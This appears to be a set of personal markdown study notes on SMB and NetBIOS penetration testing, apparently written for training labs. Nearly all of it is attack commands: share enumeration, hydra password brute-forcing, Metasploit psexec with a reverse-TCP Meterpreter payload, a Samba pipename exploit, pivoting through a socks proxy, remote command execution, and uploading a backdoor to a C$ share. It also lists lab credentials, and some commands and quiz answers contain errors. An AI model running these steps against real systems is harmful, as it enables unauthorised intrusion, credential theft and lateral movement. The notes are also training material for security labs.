```sh
smbclient -L 192.168.122.148 - Here you will get sharename for example: Anonymous
smbclient //192.168.122.148/Anonymous  - Check for the all sharename
smbclient //10.10.62.142/<share_name> -U username
smbmap -R anonymous -H 10.10.10.1
smbclient //10.10.155.249/anonymous -N
enum4linux -a 192.168.55.112
smbclient -L 10.0.1.22 -N
rpcclient -U "" -N 10.0.1.22
```


- `smbclient //10.10.62.142/<share_name> -N`
- `smb: \> prompt OFF`
- `smb: \> mget *  - it will donload all the file`
### or
- __`smbclient \\\\10.10.130.147\\Data -U thm\\guest -c 'prompt OFF;recurse ON;cd 'onboarding';lcd '/home/kali/Downloads/Reset';mget *'`__

> [!NOTE]
> - `\10.10.130.147\Data` → Connect to the Data SMB share on the target IP.
> - `-U thm\guest` → Login as user guest in domain thm.
> - `-c '<commands>'` → Run SMB commands automatically (non-interactive).
> - `prompt OFF` → Don’t ask before downloading each file.
> - `recurse ON` → Download directories recursively.
> - `cd onboarding` → Change to the onboarding folder on the SMB share.
> - `lcd /home/kali/Downloads/Reset` → Set local download folder.
> - `mget *` → Download all files from current SMB folder.


# NetBIOS & SMB Enumberation

## NetBIOS (Network Basic Input/Output System)

NetBIOS is an API and a set of network protocols for providing communicaation services over a local network. It's used primarily to allow applications on different computers to find and interact with each other on a network

Ports:
137 ---> Name Service
138 ---> Datagram Service
139 ---> Session Service over UDP and TCP

- __1.`nmblookup <ip>`__
- __2.`nbtscan <ip>`__

> Note: Sometimes NetBIOS service runs on UDP so go for -sU in Nmap
  - `nmap -sU -p 137 <ip>`
  - `nmap -sU -sV -T4 --script nbstat.nse -p 137 -Pn -n <ip>` 
# Q&A
- __1.Which tool is commonly used to perform basic NetBIOS enumeration?__
  - __Ans. `nbstat`__

## SMB (Server Message Block)

SMB is a network file sharing protocol that allows computers on a network to share files,printers, and other resources. It is the primary protocol used in Windows networks for these purposes.

Ports:
445 ---> is the direct SMB port.
139 ---> is used for SMB when it's utilizing NetBIOS over TCP/IP.

  - `nmap -sV -p 139,445 demo.ine.local`
  - `nmap -p 445 --script smb-protocols`

- __nmap__
  - __`nmap -p 445 --script smb-enum-users <ip>`__
  - __Save the users in the user.txt for brute force attack__
- __hydra__
  - __`hydra -L user.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <ip> smb`__
  - __You can use psexec module in metasploit__
- __msfconsole__
  - __`service postgresql start & msfconsole`__
  - __`search psexec`__
  - __`set RHOSTS <target ip>`__
  - __`set SMBUser <username>`__
  - __`set SMBPass <password>`__
  - __`exploit`__
  - > __If you are not getting then switch to x64 bit meterpreter session__
    - __`set payload windows/x64/meterpreter/reverse_tcp
    - __`exploit`__
  - __`sysinfo`__
  - __`shell`__
  - > __make this session in the background__

- __pivoting__
  - __set the autoroute for the target in metasploit__
    - __`run autoroute -s 10.0.1.0/20`__
  - __check the porxchain in the kali__
    - __`cat /etc/proxychains.conf` or `cat /etc/proxychains4a.conf`__
  - __search in msfconsole__
    - __`search socks4`__
    - __`use auxiliary/server/socks_proxy`__
      - __`set VERSION 4a`__
      - __`set SRVPORT 9050`__
      - __`exploit`__
  - __now open kali you can do the nmap__
    - __`proxychains nmap -sV -T4 -O -Pn -p 445 <ip>`__
  - __use the net view in the the reverse shell__
    - __`migrate -N explorer.exe`__
    - __`shell`__
     - __`net view <ip_of_the_subnet>`__
     - __`net use D: \\<subip>\Documents`__






 
# Q&A
- __1.What is the primary purpose of SMB in Windows networks?__
  - __Ans. `To facilitate network file sharing and resource access`__

- __2.Why do modern Windows networks primarily use SMB instead of NetBIOS?__
  - __Ans.`SMB offers better performance and security`__

- __3.Why is SMBv1 considered insecure?__
  - __Ans. `It allows anonymous logons and has several security vulnerabilities`__








## SMB 
+ Try to run the nmap to get the target host ip
- `nmap -T4 10.5.27.0/20 -o nmap.txt`
- 'nmap -Pn -A -sC -T4 10.5.19.82 -o nmap.txt` ---> Port scan on target ip
- `net use * /delete` ---> It delete smb local connection
- `net use z: \\10.5.19.82\c$ smbserver_771 /user:administrator`
- `nmap -p 445 --script smb-protocols 10.0.1.22`
- `nmap -p 445 --script smb-security-mode 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions 10.0.1.22`
- `nmap -p 445 --script smb-enum-seesions --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-users --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-server-stats --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-shares,smb-ls --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
- `nmap -p 445 --script smb-enum-* --script-args smbusername=administrator, smbpassword=smbserver_771 10.0.1.22`
### SMBMap
- `smbmap -u guest -p "" -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -x "ipconfig"`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -L`
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 -r 'C$'` ---> reads the content of the 'C' drive
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --upload '/root/backdoor' 'C$\backdoor'`
  - `--upload '/root/backdoor'`---> upload the backdoor file 
  - `'C$\backdoor'`  ---> giving the path to where to upload the backdoor file in target system 
- `smbmap -u administrator -p smbserver_771 -d . -H 10.0.1.22 --download "C$\flag.txt"`
- 
## Samba

#### Metasploit
* To find the smb version we can use metasploit also
- `msfconsole`
- `user auxiliary/scanner/smb/smb_version`
- `show options`
- `set rhosts <target_ip>`
- `run` or `exploit`

### nmblookup
- `nmblookup -A 10.0.1.22`
  - If you get the result `SAMBA-RECON  <20>`
  - That means there is a server running
  - so using `smbclient` we can connect to the server
  
#### smbclient
- `smbclient -L 10.0.1.22 -N`
- `rpcclient -U "" -N 10.0.1.22`

### Samba 2
- `rpcclient -U "" -N 10.0.1.22`
  - `enumdomusers`
  - `lookupnames admin`
  - `srvinfo`
- `enum4linux -o 10.0.1.22`
- `enum4linux -U 10.0.1.22`
- `smbclient -L 10.0.1.22 -N`
- `msfconsole`
- `use auxiliary/scanner/smb/smb2`
- `set RHOSTS 10.0.1.22`
- `exploit`










# exploiting using metasploit framework
- __`search type:exploit name:samba`__
- __`search pipename`__
```
use exploit/Linux/samba/is_know_pipename
exploit
```
ctr+z
upgrading to meterpreter session
```
search shell_to_meterpreter
use post/multi/manage/shell_to_meterpreter
set LHOST ech1
set session 1
exploit
```

# Exploiting SAMBA


__1. Brup force attack on SAMBA__
- __`hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.198.30.3 -t 4 smb`__

__2. smbmap__
__`smbmap -H demo.ine.local -u admin -p password1`__
  - __It will display the user's and  permissions__

__3.smbclient__
__`smbclient //demo.ine.local/shawn -U admin`__
  - __it will connect the server like a ftp__
  - __`shawn` is a user__
  - __`-U admin` authenticate as a admin mean you can login using admin logs__

__4. enum4linux__
__`enum4linux -a -u admin -p password1`__

- __1. Target information__
- __2. Users__
- __3. SID of the users__












# SMB (Server Message Block) - 445 TCP, 139 on NetBIOS
  - __used for network file sharing, printer__
  - __SAMBA is the open source linux implementation of SMB__
- __1. We will run smb_login module to find all the valid users and their passwords.__
```
service postgresql start && msfconsole -q
use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS demo.ine.local
set VERBOSE false
exploit
```
## We have found four valid users and their passwords
- __2.Running psexec module to gain the meterpreter shell..__
```
service postgresql start && msfconsole -q
use exploit/windows/smb/psexec
set RHOSTS demo.ine.local
set SMBUser Administrator
set SMBPass qwertyuiop
exploit
```

